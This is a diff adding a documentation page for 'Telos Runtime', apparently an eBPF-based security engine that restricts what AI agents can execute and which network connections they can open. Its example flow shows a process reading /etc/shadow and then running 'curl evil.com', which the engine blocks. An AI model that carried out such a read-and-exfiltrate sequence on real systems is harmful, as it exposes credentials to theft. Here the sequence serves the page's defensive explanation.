@@ -1,0 +1,56 @@
+---
+title: "Telos Runtime Overview"
+description: "Intent-based AI security with eBPF-LSM Dual-Gate enforcement, IFC taint tracking, and Network Slam."
+view: engineer
+component: telos-runtime
+order: 1
+---
+
+# Telos Runtime
+
+### Intent-Based AI Security Engine
+
+Telos Runtime enforces AI agent behavior through Natural Language Intent Declarations, eBPF-LSM syscall gates, and real-time Information Flow Control. It implements the **Dual-Gate Architecture** with cross-vector taint tracking.
+
+---
+
+## Dual-Gate Architecture
+
+| Gate | LSM Hook | Purpose |
+|:-----|:---------|:--------|
+| Execution Gate | `lsm/bprm_check_security` | Only explicitly declared binaries are allowed to execute |
+| Network Gate | `lsm/socket_connect` | Network access denied for tainted processes |
+| File Gate | `lsm/file_open` | Dynamic taint elevation for sensitive file access |
+
+---
+
+## Information Flow Control (IFC)
+
+When a process accesses a sensitive file (e.g., `/etc/shadow`), the eBPF hook elevates its taint level to `TAINT_CRITICAL`. This taint is **irreversible** for the lifetime of the process.
+
+**Network Slam:** Any tainted process that attempts a network connection receives `-EPERM`. The data never leaves the machine.
+
+```
+Process reads /etc/shadow
+  → eBPF elevates taint to CRITICAL
+  → Process tries curl evil.com
+  → lsm/socket_connect returns -EPERM
+  → Network Slam: connection killed
+  → Data exfiltration prevented
+```
+
+---
+
+## Domain Intelligence Engine
+
+The Telos Cortex engine implements a 5-layer classification pipeline:
+
+| Layer | Classification | Technique |
+|:------|:--------------|:----------|
+| L0 | Static Blocklist | Known malicious domains |
+| L1 | Typosquatting Detection | SymSpell O(1) edit distance |
+| L2 | Homoglyph Analysis | Unicode normalization and visual similarity |
+| L3 | Domain Reputation | Age, registrar, TLS certificate analysis |
+| L4 | AI Semantic Analysis | LLM-based intent evaluation (out-of-path) |
+
+> The LLM evaluation at L4 operates entirely **out-of-path**. It never enters the kernel hot path. All ALLOW/DENY decisions are deterministic O(1) hash table lookups.
